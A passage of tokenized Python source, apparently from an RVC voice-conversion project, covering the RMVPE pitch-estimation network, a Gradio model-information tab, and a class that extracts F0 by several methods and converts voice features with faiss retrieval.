<EOL> for i in range ( self . n_blocks ) : <EOL> x = self . conv [ i ] ( x ) <EOL> if self . kernel_size is not None : <EOL> return x , self . pool ( x ) <EOL> else : <EOL> return x <EOL> class Intermediate ( nn . Module ) : <EOL> def __init__ ( self , in_channels , out_channels , n_inters , n_blocks , momentum = <NUM_LIT> ) : <EOL> super ( Intermediate , self ) . __init__ ( ) <EOL> self . n_inters = n_inters <EOL> self . layers = nn . ModuleList ( ) <EOL> self . layers . append ( <EOL> ResEncoderBlock ( in_channels , out_channels , None , n_blocks , momentum ) <EOL> ) <EOL> for i in range ( self . n_inters - <NUM_LIT> ) : <EOL> self . layers . append ( <EOL> ResEncoderBlock ( out_channels , out_channels , None , n_blocks , momentum ) <EOL> ) <EOL> def forward ( self , x ) : <EOL> for i in range ( self . n_inters ) : <EOL> x = self . layers [ i ] ( x ) <EOL> return x <EOL> class ResDecoderBlock ( nn . Module ) : <EOL> def __init__ ( self , in_channels , out_channels , stride , n_blocks = <NUM_LIT> , momentum = <NUM_LIT> ) : <EOL> super ( ResDecoderBlock , self ) . __init__ ( ) <EOL> out_padding = ( <NUM_LIT> , <NUM_LIT> ) if stride == ( <NUM_LIT> , <NUM_LIT> ) else ( <NUM_LIT> , <NUM_LIT> ) <EOL> self . n_blocks = n_blocks <EOL> self . conv1 = nn . Sequential ( <EOL> nn . ConvTranspose2d ( <EOL> in_channels = in_channels , <EOL> out_channels = out_channels , <EOL> kernel_size = ( <NUM_LIT> , <NUM_LIT> ) , <EOL> stride = stride , <EOL> padding = ( <NUM_LIT> , <NUM_LIT> ) , <EOL> output_padding = out_padding , <EOL> bias = False , <EOL> ) , <EOL> nn . BatchNorm2d ( out_channels , momentum = momentum ) , <EOL> nn . ReLU ( ) , <EOL> ) <EOL> self . conv2 = nn . ModuleList ( ) <EOL> self . conv2 . append ( ConvBlockRes ( out_channels * <NUM_LIT> , out_channels , momentum ) ) <EOL> for i in range ( n_blocks - <NUM_LIT> ) : <EOL> self . conv2 . append ( ConvBlockRes ( out_channels , out_channels , momentum ) ) <EOL> def forward ( self , x , concat_tensor ) : <EOL> x = self . conv1 ( x ) <EOL> x = torch . cat ( ( x , concat_tensor ) , dim = <NUM_LIT> ) <EOL> for i in range ( self . n_blocks ) : <EOL> x = self . conv2 [ i ] ( x ) <EOL> return x <EOL> class Decoder ( nn . Module ) : <EOL> def __init__ ( self , in_channels , n_decoders , stride , n_blocks , momentum = <NUM_LIT> ) : <EOL> super ( Decoder , self ) . __init__ ( ) <EOL> self . layers = nn . ModuleList ( ) <EOL> self . n_decoders = n_decoders <EOL> for i in range ( self . n_decoders ) : <EOL> out_channels = in_channels // <NUM_LIT> <EOL> self . layers . append ( <EOL> ResDecoderBlock ( in_channels , out_channels , stride , n_blocks , momentum ) <EOL> ) <EOL> in_channels = out_channels <EOL> def forward ( self , x , concat_tensors ) : <EOL> for i in range ( self . n_decoders ) : <EOL> x = self . layers [ i ] ( x , concat_tensors [ - <NUM_LIT> - i ] ) <EOL> return x <EOL> class DeepUnet ( nn . Module ) : <EOL> def __init__ ( <EOL> self , <EOL> kernel_size , <EOL> n_blocks , <EOL> en_de_layers = <NUM_LIT> , <EOL> inter_layers = <NUM_LIT> , <EOL> in_channels = <NUM_LIT> , <EOL> en_out_channels = <NUM_LIT> , <EOL> ) : <EOL> super ( DeepUnet , self ) . __init__ ( ) <EOL> self . encoder = Encoder ( <EOL> in_channels , <NUM_LIT> , en_de_layers , kernel_size , n_blocks , en_out_channels <EOL> ) <EOL> self . intermediate = Intermediate ( <EOL> self . encoder . out_channel // <NUM_LIT> , <EOL> self . encoder . out_channel , <EOL> inter_layers , <EOL> n_blocks , <EOL> ) <EOL> self . decoder = Decoder ( <EOL> self . encoder . out_channel , en_de_layers , kernel_size , n_blocks <EOL> ) <EOL> def forward ( self , x ) : <EOL> x , concat_tensors = self . encoder ( x ) <EOL> x = self . intermediate ( x ) <EOL> x = self . decoder ( x , concat_tensors ) <EOL> return x <EOL> class E2E ( nn . Module ) : <EOL> def __init__ ( <EOL> self , <EOL> n_blocks , <EOL> n_gru , <EOL> kernel_size , <EOL> en_de_layers = <NUM_LIT> , <EOL> inter_layers = <NUM_LIT> , <EOL> in_channels = <NUM_LIT> , <EOL> en_out_channels = <NUM_LIT> , <EOL> ) : <EOL> super ( E2E , self ) . __init__ ( ) <EOL> self . unet = DeepUnet ( <EOL> kernel_size , <EOL> n_blocks , <EOL> en_de_layers , <EOL> inter_layers , <EOL> in_channels , <EOL> en_out_channels , <EOL> ) <EOL> self . cnn = nn . Conv2d ( en_out_channels , <NUM_LIT> , ( <NUM_LIT> , <NUM_LIT> ) , padding = ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> if n_gru : <EOL> self . fc = nn . Sequential ( <EOL> BiGRU ( <NUM_LIT> * <NUM_LIT> , <NUM_LIT> , n_gru ) , <EOL> nn . Linear ( <NUM_LIT> , <NUM_LIT> ) , <EOL> nn . Dropout ( <NUM_LIT> ) , <EOL> nn . Sigmoid ( ) , <EOL> ) <EOL> def forward ( self , mel ) : <EOL> mel = mel . transpose ( - <NUM_LIT> , - <NUM_LIT> ) . unsqueeze ( <NUM_LIT> ) <EOL> x = self . cnn ( self . unet ( mel ) ) . transpose ( <NUM_LIT> , <NUM_LIT> ) . flatten ( - <NUM_LIT> ) <EOL> x = self . fc ( x ) <EOL> return x <EOL> class MelSpectrogram ( torch . nn . Module ) : <EOL> def __init__ ( <EOL> self , <EOL> is_half , <EOL> n_mel_channels , <EOL> sampling_rate , <EOL> win_length , <EOL> hop_length , <EOL> n_fft = None , <EOL> mel_fmin = <NUM_LIT> , <EOL> mel_fmax = None , <EOL> clamp = <NUM_LIT> , <EOL> ) : <EOL> super ( ) . __init__ ( ) <EOL> n_fft = win_length if n_fft is None else n_fft <EOL> self . hann_window = { } <EOL> mel_basis = mel ( <EOL> sr = sampling_rate , <EOL> n_fft = n_fft , <EOL> n_mels = n_mel_channels , <EOL> fmin = mel_fmin , <EOL> fmax = mel_fmax , <EOL> htk = True , <EOL> ) <EOL> mel_basis = torch . from_numpy ( mel_basis ) . float ( ) <EOL> self . register_buffer ( "<STR_LIT>" , mel_basis ) <EOL> self . n_fft = win_length if n_fft is None else n_fft <EOL> self . hop_length = hop_length <EOL> self . win_length = win_length <EOL> self . sampling_rate = sampling_rate <EOL> self . n_mel_channels = n_mel_channels <EOL> self . clamp = clamp <EOL> self . is_half = is_half <EOL> def forward ( self , audio , keyshift = <NUM_LIT> , speed = <NUM_LIT> , center = True ) : <EOL> factor = <NUM_LIT> ** ( keyshift / <NUM_LIT> ) <EOL> n_fft_new = int ( np . round ( self . n_fft * factor ) ) <EOL> win_length_new = int ( np . round ( self . win_length * factor ) ) <EOL> hop_length_new = int ( np . round ( self . hop_length * speed ) ) <EOL> keyshift_key = str ( keyshift ) + "<STR_LIT>" + str ( audio . device ) <EOL> if keyshift_key not in self . hann_window : <EOL> self . hann_window [ keyshift_key ] = torch . hann_window ( win_length_new ) . to ( <EOL> audio . device <EOL> ) <EOL> fft = torch . stft ( <EOL> audio , <EOL> n_fft = n_fft_new , <EOL> hop_length = hop_length_new , <EOL> win_length = win_length_new , <EOL> window = self . hann_window [ keyshift_key ] , <EOL> center = center , <EOL> return_complex = True , <EOL> ) <EOL> magnitude = torch . sqrt ( fft . real . pow ( <NUM_LIT> ) + fft . imag . pow ( <NUM_LIT> ) ) <EOL> if keyshift != <NUM_LIT> : <EOL> size = self . n_fft // <NUM_LIT> + <NUM_LIT> <EOL> resize = magnitude . size ( <NUM_LIT> ) <EOL> if resize < size : <EOL> magnitude = F . pad ( magnitude , ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , size - resize ) ) <EOL> magnitude = magnitude [ : , : size , : ] * self . win_length / win_length_new <EOL> mel_output = torch . matmul ( self . mel_basis , magnitude ) <EOL> if self . is_half == True : <EOL> mel_output = mel_output . half ( ) <EOL> log_mel_spec = torch . log ( torch . clamp ( mel_output , min = self . clamp ) ) <EOL> return log_mel_spec <EOL> class RMVPE : <EOL> def __init__ ( self , model_path , is_half , device = None ) : <EOL> self . resample_kernel = { } <EOL> model = E2E ( <NUM_LIT> , <NUM_LIT> , ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> ckpt = torch . load ( model_path , map_location = "<STR_LIT>" ) <EOL> model . load_state_dict ( ckpt ) <EOL> model . eval ( ) <EOL> if is_half == True : <EOL> model = model . half ( ) <EOL> self . model = model <EOL> self . resample_kernel = { } <EOL> self . is_half = is_half <EOL> if device is None : <EOL> device = "<STR_LIT>" if torch . cuda . is_available ( ) else "<STR_LIT>" <EOL> self . device = device <EOL> self . mel_extractor = MelSpectrogram ( <EOL> is_half , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , None , <NUM_LIT> , <NUM_LIT> <EOL> ) . to ( device ) <EOL> self . model = self . model . to ( device ) <EOL> cents_mapping = <NUM_LIT> * np . arange ( <NUM_LIT> ) + <NUM_LIT> <EOL> self . cents_mapping = np . pad ( cents_mapping , ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> def mel2hidden ( self , mel ) : <EOL> with torch . no_grad ( ) : <EOL> n_frames = mel . shape [ - <NUM_LIT> ] <EOL> mel = F . pad ( <EOL> mel , ( <NUM_LIT> , <NUM_LIT> * ( ( n_frames - <NUM_LIT> ) // <NUM_LIT> + <NUM_LIT> ) - n_frames ) , mode = "<STR_LIT>" <EOL> ) <EOL> hidden = self . model ( mel ) <EOL> return hidden [ : , : n_frames ] <EOL> def decode ( self , hidden , thred = <NUM_LIT> ) : <EOL> cents_pred = self . to_local_average_cents ( hidden , thred = thred ) <EOL> f0 = <NUM_LIT> * ( <NUM_LIT> ** ( cents_pred / <NUM_LIT> ) ) <EOL> f0 [ f0 == <NUM_LIT> ] = <NUM_LIT> <EOL> return f0 <EOL> def infer_from_audio ( self , audio , thred = <NUM_LIT> ) : <EOL> audio = torch . from_numpy ( audio ) . float ( ) . to ( self . device ) . unsqueeze ( <NUM_LIT> ) <EOL> mel = self . mel_extractor ( audio , center = True ) <EOL> hidden = self . mel2hidden ( mel ) <EOL> hidden = hidden . squeeze ( <NUM_LIT> ) . cpu ( ) . numpy ( ) <EOL> if self . is_half == True : <EOL> hidden = hidden . astype ( "<STR_LIT>" ) <EOL> f0 = self . decode ( hidden , thred = thred ) <EOL> return f0 <EOL> def to_local_average_cents ( self , salience , thred = <NUM_LIT> ) : <EOL> center = np . argmax ( salience , axis = <NUM_LIT> ) <EOL> salience = np . pad ( salience , ( ( <NUM_LIT> , <NUM_LIT> ) , ( <NUM_LIT> , <NUM_LIT> ) ) ) <EOL> center += <NUM_LIT> <EOL> todo_salience = [ ] <EOL> todo_cents_mapping = [ ] <EOL> starts = center - <NUM_LIT> <EOL> ends = center + <NUM_LIT> <EOL> for idx in range ( salience . shape [ <NUM_LIT> ] ) : <EOL> todo_salience . append ( salience [ : , starts [ idx ] : ends [ idx ] ] [ idx ] ) <EOL> todo_cents_mapping . append ( self . cents_mapping [ starts [ idx ] : ends [ idx ] ] ) <EOL> todo_salience = np . array ( todo_salience ) <EOL> todo_cents_mapping = np . array ( todo_cents_mapping ) <EOL> product_sum = np . sum ( todo_salience * todo_cents_mapping , <NUM_LIT> ) <EOL> weight_sum = np . sum ( todo_salience , <NUM_LIT> ) <EOL> devided = product_sum / weight_sum <EOL> maxx = np . max ( salience , axis = <NUM_LIT> ) <EOL> devided [ maxx <= thred ] = <NUM_LIT> <EOL> return devided <EOL> </s>
<s> import gradio as gr <EOL> from core import run_model_information_script <EOL> from assets . i18n . i18n import I18nAuto <EOL> i18n = I18nAuto ( ) <EOL> def model_information_tab ( ) : <EOL> with gr . Column ( ) : <EOL> model_name = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> placeholder = i18n ( "<STR_LIT>" ) , <EOL> interactive = True , <EOL> ) <EOL> model_information_output_info = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> value = "<STR_LIT>" , <EOL> max_lines = <NUM_LIT> , <EOL> interactive = False , <EOL> ) <EOL> model_information_button = gr . Button ( i18n ( "<STR_LIT>" ) ) <EOL> model_information_button . click ( <EOL> run_model_information_script , <EOL> [ model_name ] , <EOL> model_information_output_info , <EOL> api_name = "<STR_LIT>" , <EOL> ) <EOL> </s>
<s> import numpy as np , parselmouth , torch , pdb , sys , os <EOL> from time import time as ttime <EOL> import torch . nn . functional as F <EOL> import torchcrepe <EOL> from torch import Tensor <EOL> import scipy . signal as signal <EOL> import pyworld , os , faiss , librosa , torchcrepe <EOL> from scipy import signal <EOL> from functools import lru_cache <EOL> import random <EOL> import gc <EOL> import re <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> from rvc . lib . FCPEF0Predictor import FCPEF0Predictor <EOL> bh , ah = signal . butter ( N = <NUM_LIT> , Wn = <NUM_LIT> , btype = "<STR_LIT>" , fs = <NUM_LIT> ) <EOL> input_audio_path2wav = { } <EOL> @ lru_cache <EOL> def cache_harvest_f0 ( input_audio_path , fs , f0max , f0min , frame_period ) : <EOL> audio = input_audio_path2wav [ input_audio_path ] <EOL> f0 , t = pyworld . harvest ( <EOL> audio , <EOL> fs = fs , <EOL> f0_ceil = f0max , <EOL> f0_floor = f0min , <EOL> frame_period = frame_period , <EOL> ) <EOL> f0 = pyworld . stonemask ( audio , f0 , t , fs ) <EOL> return f0 <EOL> def change_rms ( data1 , sr1 , data2 , sr2 , rate ) : <EOL> rms1 = librosa . feature . rms ( y = data1 , frame_length = sr1 // <NUM_LIT> * <NUM_LIT> , hop_length = sr1 // <NUM_LIT> ) <EOL> rms2 = librosa . feature . rms ( y = data2 , frame_length = sr2 // <NUM_LIT> * <NUM_LIT> , hop_length = sr2 // <NUM_LIT> ) <EOL> rms1 = torch . from_numpy ( rms1 ) <EOL> rms1 = F . interpolate ( <EOL> rms1 . unsqueeze ( <NUM_LIT> ) , size = data2 . shape [ <NUM_LIT> ] , mode = "<STR_LIT>" <EOL> ) . squeeze ( ) <EOL> rms2 = torch . from_numpy ( rms2 ) <EOL> rms2 = F . interpolate ( <EOL> rms2 . unsqueeze ( <NUM_LIT> ) , size = data2 . shape [ <NUM_LIT> ] , mode = "<STR_LIT>" <EOL> ) . squeeze ( ) <EOL> rms2 = torch . max ( rms2 , torch . zeros_like ( rms2 ) + <NUM_LIT> ) <EOL> data2 *= ( <EOL> torch . pow ( rms1 , torch . tensor ( <NUM_LIT> - rate ) ) <EOL> * torch . pow ( rms2 , torch . tensor ( rate - <NUM_LIT> ) ) <EOL> ) . numpy ( ) <EOL> return data2 <EOL> class VC ( object ) : <EOL> def __init__ ( self , tgt_sr , config ) : <EOL> self . x_pad , self . x_query , self . x_center , self . x_max , self . is_half = ( <EOL> config . x_pad , <EOL> config . x_query , <EOL> config . x_center , <EOL> config . x_max , <EOL> config . is_half , <EOL> ) <EOL> self . sr = <NUM_LIT> <EOL> self . window = <NUM_LIT> <EOL> self . t_pad = self . sr * self . x_pad <EOL> self . t_pad_tgt = tgt_sr * self . x_pad <EOL> self . t_pad2 = self . t_pad * <NUM_LIT> <EOL> self . t_query = self . sr * self . x_query <EOL> self . t_center = self . sr * self . x_center <EOL> self . t_max = self . sr * self . x_max <EOL> self . device = config . device <EOL> self . ref_freqs = [ <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> ] <EOL> self . note_dict = self . generate_interpolated_frequencies ( ) <EOL> def generate_interpolated_frequencies ( self ) : <EOL> note_dict = [ ] <EOL> for i in range ( len ( self . ref_freqs ) - <NUM_LIT> ) : <EOL> freq_low = self . ref_freqs [ i ] <EOL> freq_high = self . ref_freqs [ i + <NUM_LIT> ] <EOL> interpolated_freqs = np . linspace ( <EOL> freq_low , freq_high , num = <NUM_LIT> , endpoint = False <EOL> ) <EOL> note_dict . extend ( interpolated_freqs ) <EOL> note_dict . append ( self . ref_freqs [ - <NUM_LIT> ] ) <EOL> return note_dict <EOL> def autotune_f0 ( self , f0 ) : <EOL> autotuned_f0 = np . zeros_like ( f0 ) <EOL> for i , freq in enumerate ( f0 ) : <EOL> closest_note = min ( self . note_dict , key = lambda x : abs ( x - freq ) ) <EOL> autotuned_f0 [ i ] = closest_note <EOL> return autotuned_f0 <EOL> def get_optimal_torch_device ( self , index : int = <NUM_LIT> ) -> torch . device : <EOL> if torch . cuda . is_available ( ) : <EOL> return torch . device ( f"<STR_LIT>" ) <EOL> elif torch . backends . mps . is_available ( ) : <EOL> return torch . device ( "<STR_LIT>" ) <EOL> return torch . device ( "<STR_LIT>" ) <EOL> def get_f0_crepe_computation ( <EOL> self , <EOL> x , <EOL> f0_min , <EOL> f0_max , <EOL> p_len , <EOL> hop_length , <EOL> model = "<STR_LIT>" , <EOL> ) : <EOL> x = x . astype ( np . float32 ) <EOL> x /= np . quantile ( np . abs ( x ) , <NUM_LIT> ) <EOL> torch_device = self . get_optimal_torch_device ( ) <EOL> audio = torch . from_numpy ( x ) . to ( torch_device , copy = True ) <EOL> audio = torch . unsqueeze ( audio , dim = <NUM_LIT> ) <EOL> if audio . ndim == <NUM_LIT> and audio . shape [ <NUM_LIT> ] > <NUM_LIT> : <EOL> audio = torch . mean ( audio , dim = <NUM_LIT> , keepdim = True ) . detach ( ) <EOL> audio = audio . detach ( ) <EOL> pitch : Tensor = torchcrepe . predict ( <EOL> audio , <EOL> self . sr , <EOL> hop_length , <EOL> f0_min , <EOL> f0_max , <EOL> model , <EOL> batch_size = hop_length * <NUM_LIT> , <EOL> device = torch_device , <EOL> pad = True , <EOL> ) <EOL> p_len = p_len or x . shape [ <NUM_LIT> ] // hop_length <EOL> source = np . array ( pitch . squeeze ( <NUM_LIT> ) . cpu ( ) . float ( ) . numpy ( ) ) <EOL> source [ source < <NUM_LIT> ] = np . nan <EOL> target = np . interp ( <EOL> np . arange ( <NUM_LIT> , len ( source ) * p_len , len ( source ) ) / p_len , <EOL> np . arange ( <NUM_LIT> , len ( source ) ) , <EOL> source , <EOL> ) <EOL> f0 = np . nan_to_num ( target ) <EOL> return f0 <EOL> def get_f0_official_crepe_computation ( <EOL> self , <EOL> x , <EOL> f0_min , <EOL> f0_max , <EOL> model = "<STR_LIT>" , <EOL> ) : <EOL> batch_size = <NUM_LIT> <EOL> audio = torch . tensor ( np . copy ( x ) ) [ None ] . float ( ) <EOL> f0 , pd = torchcrepe . predict ( <EOL> audio , <EOL> self . sr , <EOL> self . window , <EOL> f0_min , <EOL> f0_max , <EOL> model , <EOL> batch_size = batch_size , <EOL> device = self . device , <EOL> return_periodicity = True , <EOL> ) <EOL> pd = torchcrepe . filter . median ( pd , <NUM_LIT> ) <EOL> f0 = torchcrepe . filter . mean ( f0 , <NUM_LIT> ) <EOL> f0 [ pd < <NUM_LIT> ] = <NUM_LIT> <EOL> f0 = f0 [ <NUM_LIT> ] . cpu ( ) . numpy ( ) <EOL> return f0 <EOL> def get_f0_hybrid_computation ( <EOL> self , <EOL> methods_str , <EOL> x , <EOL> f0_min , <EOL> f0_max , <EOL> p_len , <EOL> hop_length , <EOL> ) : <EOL> methods_str = re . search ( "<STR_LIT>" , methods_str ) <EOL> if methods_str : <EOL> methods = [ method . strip ( ) for method in methods_str . group ( <NUM_LIT> ) . split ( "<STR_LIT>" ) ] <EOL> f0_computation_stack = [ ] <EOL> print ( f"<STR_LIT>" ) <EOL> x = x . astype ( np . float32 ) <EOL> x /= np . quantile ( np . abs ( x ) , <NUM_LIT> ) <EOL> for method in methods : <EOL> f0 = None <EOL> if method == "<STR_LIT>" : <EOL> f0 = self . get_f0_crepe_computation ( <EOL> x , f0_min , f0_max , p_len , int ( hop_length ) <EOL> ) <EOL> elif method == "<STR_LIT>" : <EOL> if hasattr ( self , "<STR_LIT>" ) == False : <EOL> from rvc . lib . rmvpe import RMVPE <EOL> self . model_rmvpe = RMVPE ( <EOL> "<STR_LIT>" , is_half = self . is_half , device = self . device <EOL> ) <EOL> f0 = self . model_rmvpe . infer_from_audio ( x , thred = <NUM_LIT> ) <EOL> f0 = f0 [ <NUM_LIT> : ] <EOL> elif method == "<STR_LIT>" : <EOL> self . model_fcpe = FCPEF0Predictor ( <EOL> "<STR_LIT>" , <EOL> f0_min = int ( f0_min ) , <EOL> f0_max = int ( f0_max ) , <EOL> dtype = torch . float32 , <EOL> device = self . device , <EOL> sampling_rate = self . sr , <EOL> threshold = <NUM_LIT> , <EOL> ) <EOL> f0 = self . model_fcpe . compute_f0 ( x , p_len = p_len ) <EOL> del self . model_fcpe <EOL> gc . collect ( ) <EOL> f0_computation_stack . append ( f0 ) <EOL> print ( f"<STR_LIT>" ) <EOL> f0_computation_stack = [ fc for fc in f0_computation_stack if fc is not None ] <EOL> f0_median_hybrid = None <EOL> if len ( f0_computation_stack ) == <NUM_LIT> : <EOL> f0_median_hybrid = f0_computation_stack [ <NUM_LIT> ] <EOL> else : <EOL> f0_median_hybrid = np . nanmedian ( f0_computation_stack , axis = <NUM_LIT> ) <EOL> return f0_median_hybrid <EOL> def get_f0 ( <EOL> self , <EOL> input_audio_path , <EOL> x , <EOL> p_len , <EOL> f0_up_key , <EOL> f0_method , <EOL> filter_radius , <EOL> hop_length , <EOL> f0autotune , <EOL> inp_f0 = None , <EOL> ) : <EOL> global input_audio_path2wav <EOL> time_step = self . window / self . sr * <NUM_LIT> <EOL> f0_min = <NUM_LIT> <EOL> f0_max = <NUM_LIT> <EOL> f0_mel_min = <NUM_LIT> * np . log ( <NUM_LIT> + f0_min / <NUM_LIT> ) <EOL> f0_mel_max = <NUM_LIT> * np . log ( <NUM_LIT> + f0_max / <NUM_LIT> ) <EOL> if f0_method == "<STR_LIT>" : <EOL> f0 = ( <EOL> parselmouth . Sound ( x , self . sr ) <EOL> . to_pitch_ac ( <EOL> time_step = time_step / <NUM_LIT> , <EOL> voicing_threshold = <NUM_LIT> , <EOL> pitch_floor = f0_min , <EOL> pitch_ceiling = f0_max , <EOL> ) <EOL> . selected_array [ "<STR_LIT>" ] <EOL> ) <EOL> pad_size = ( p_len - len ( f0 ) + <NUM_LIT> ) // <NUM_LIT> <EOL> if pad_size > <NUM_LIT> or p_len - len ( f0 ) - pad_size > <NUM_LIT> : <EOL> f0 = np . pad ( <EOL> f0 , [ [ pad_size , p_len - len ( f0 ) - pad_size ] ] , mode = "<STR_LIT>" <EOL> ) <EOL> elif f0_method == "<STR_LIT>" : <EOL> input_audio_path2wav [ input_audio_path ] = x . astype ( np . double ) <EOL> f0 = cache_harvest_f0 ( input_audio_path , self . sr , f0_max , f0_min , <NUM_LIT> ) <EOL> if int ( filter_radius ) > <NUM_LIT> : <EOL> f0 = signal . medfilt ( f0 , <NUM_LIT> ) <EOL> elif f0_method == "<STR_LIT>" : <EOL> f0 , t = pyworld . dio ( <EOL> x . astype ( np . double ) , <EOL> fs = self . sr , <EOL> f0_ceil = f0_max , <EOL> f0_floor = f0_min , <EOL> frame_period = <NUM_LIT> , <EOL> ) <EOL> f0 = pyworld . stonemask ( x . astype ( np . double ) , f0 , t , self . sr ) <EOL> f0 = signal . medfilt ( f0 , <NUM_LIT> ) <EOL> elif f0_method == "<STR_LIT>" : <EOL> f0 = self . get_f0_crepe_computation ( <EOL> x , f0_min , f0_max , p_len , int ( hop_length ) <EOL> ) <EOL> elif f0_method == "<STR_LIT>" : <EOL> f0 = self . get_f0_crepe_computation ( <EOL> x , f0_min , f0_max , p_len , int ( hop_length ) , "<STR_LIT>" <EOL> ) <EOL> elif f0_method == "<STR_LIT>" : <EOL> if hasattr ( self , "<STR_LIT>" ) == False : <EOL> from rvc . lib . rmvpe import RMVPE <EOL> self . model_rmvpe = RMVPE ( <EOL> "<STR_LIT>" , is_half = self . is_half , device = self . device <EOL> ) <EOL> f0 = self . model_rmvpe . infer_from_audio ( x , thred = <NUM_LIT> ) <EOL> elif f0_method == "<STR_LIT>" : <EOL> self . model_fcpe = FCPEF0Predictor ( <EOL> "<STR_LIT>" , <EOL> f0_min = int ( f0_min ) , <EOL> f0_max = int ( f0_max ) , <EOL> dtype = torch . float32 , <EOL> device = self . device , <EOL> sampling_rate = self . sr , <EOL> threshold = <NUM_LIT> , <EOL> ) <EOL> f0 = self . model_fcpe . compute_f0 ( x , p_len = p_len ) <EOL> del self . model_fcpe <EOL> gc . collect ( ) <EOL> elif "<STR_LIT>" in f0_method : <EOL> input_audio_path2wav [ input_audio_path ] = x . astype ( np . double ) <EOL> f0 = self . get_f0_hybrid_computation ( <EOL> f0_method , <EOL> x , <EOL> f0_min , <EOL> f0_max , <EOL> p_len , <EOL> hop_length , <EOL> ) <EOL> if f0autotune == "<STR_LIT>" : <EOL> f0 = self . autotune_f0 ( f0 ) <EOL> f0 *= pow ( <NUM_LIT> , f0_up_key / <NUM_LIT> ) <EOL> tf0 = self . sr // self . window <EOL> if inp_f0 is not None : <EOL> delta_t = np . round ( <EOL> ( inp_f0 [ : , <NUM_LIT> ] . max ( ) - inp_f0 [ : , <NUM_LIT> ] . min ( ) ) * tf0 + <NUM_LIT> <EOL> ) . astype ( "<STR_LIT>" ) <EOL> replace_f0 = np . interp ( <EOL> list ( range ( delta_t ) ) , inp_f0 [ : , <NUM_LIT> ] * <NUM_LIT> , inp_f0 [ : , <NUM_LIT> ] <EOL> ) <EOL> shape = f0 [ self . x_pad * tf0 : self . x_pad * tf0 + len ( replace_f0 ) ] . shape [ <NUM_LIT> ] <EOL> f0 [ self . x_pad * tf0 : self . x_pad * tf0 + len ( replace_f0 ) ] = replace_f0 [ <EOL> : shape <EOL> ] <EOL> f0bak = f0 . copy ( ) <EOL> f0_mel = <NUM_LIT> * np . log ( <NUM_LIT> + f0 / <NUM_LIT> ) <EOL> f0_mel [ f0_mel > <NUM_LIT> ] = ( f0_mel [ f0_mel > <NUM_LIT> ] - f0_mel_min ) * <NUM_LIT> / ( <EOL> f0_mel_max - f0_mel_min <EOL> ) + <NUM_LIT> <EOL> f0_mel [ f0_mel <= <NUM_LIT> ] = <NUM_LIT> <EOL> f0_mel [ f0_mel > <NUM_LIT> ] = <NUM_LIT> <EOL> f0_coarse = np . rint ( f0_mel ) . astype ( np . int ) <EOL> return f0_coarse , f0bak <EOL> def vc ( <EOL> self , <EOL> model , <EOL> net_g , <EOL> sid , <EOL> audio0 , <EOL> pitch , <EOL> pitchf , <EOL> index , <EOL> big_npy , <EOL> index_rate , <EOL> version , <EOL> protect , <EOL> ) : <EOL> feats = torch . from_numpy ( audio0 ) <EOL> if self . is_half : <EOL> feats = feats . half ( ) <EOL> else : <EOL> feats = feats . float ( ) <EOL> if feats . dim ( ) == <NUM_LIT> : <EOL> feats = feats . mean ( - <NUM_LIT> ) <EOL> assert feats . dim ( ) == <NUM_LIT> , feats . dim ( ) <EOL> feats = feats . view ( <NUM_LIT> , - <NUM_LIT> ) <EOL> padding_mask = torch . BoolTensor ( feats . shape ) . to ( self . device ) . fill_ ( False ) <EOL> inputs = { <EOL> "<STR_LIT>" : feats . to ( self . device ) , <EOL> "<STR_LIT>" : padding_mask , <EOL> "<STR_LIT>" : <NUM_LIT> if version == "<STR_LIT>" else <NUM_LIT> , <EOL> } <EOL> t0 = ttime ( ) <EOL> with torch . no_grad ( ) : <EOL> logits = model . extract_features ( ** inputs ) <EOL> feats = model . final_proj ( logits [ <NUM_LIT> ] ) if version == "<STR_LIT>" else logits [ <NUM_LIT> ] <EOL> if protect < <NUM_LIT> and pitch != None and pitchf != None : <EOL> feats0 = feats . clone ( ) <EOL> if ( <EOL> isinstance ( index , type ( None ) ) == False <EOL> and isinstance ( big_npy , type ( None ) ) == False <EOL> and index_rate != <NUM_LIT> <EOL> ) : <EOL> npy = feats [ <NUM_LIT> ] . cpu ( ) . numpy ( ) <EOL> if self . is_half : <EOL> npy = npy . astype ( "<STR_LIT>" ) <EOL> score , ix = index . search ( npy , k = <NUM_LIT> ) <EOL> weight = np . square ( <NUM_LIT> / score ) <EOL> weight /= weight . sum ( axis = <NUM_LIT> , keepdims = True ) <EOL> npy = np . sum ( big_npy [ ix ] * np . expand_dims ( weight , axis = <NUM_LIT> ) , axis = <NUM_LIT> ) <EOL> if self . is_half : <EOL> npy = npy . astype ( "<STR_LIT>" ) <EOL> feats = ( <EOL> torch . from_numpy ( npy ) . unsqueeze ( <NUM_LIT> ) . to ( self . device ) * index_rate <EOL> + ( <NUM_LIT> - index_rate ) * feats <EOL> ) <EOL> feats = F . interpolate ( feats . permute ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) , scale_factor = <NUM_LIT> ) . permute ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) <EOL> if protect < <NUM_LIT> and pitch != None and pitchf != None : <EOL> feats0 = F . interpolate ( feats0 . permute ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) , scale_factor = <NUM_LIT> ) . permute ( <EOL> <NUM_LIT> , <NUM_LIT> , <NUM_LIT> <EOL> ) <EOL> t1 = ttime ( ) <EOL> p_len = audio0 . shape [ <NUM_LIT> ] // self . window <EOL> if feats . shape [ <NUM_LIT> ] < p_len : <EOL> p_len = feats . shape [ <NUM_LIT> ] <EOL> if pitch != None and pitchf != None : <EOL> pitch = pitch [ : , : p_len ] <EOL> pitchf = pitchf [ : , : p_len ] <EOL> if protect < <NUM_LIT> and pitch != None and pitchf != None : <EOL> pitchff = pitchf . clone ( 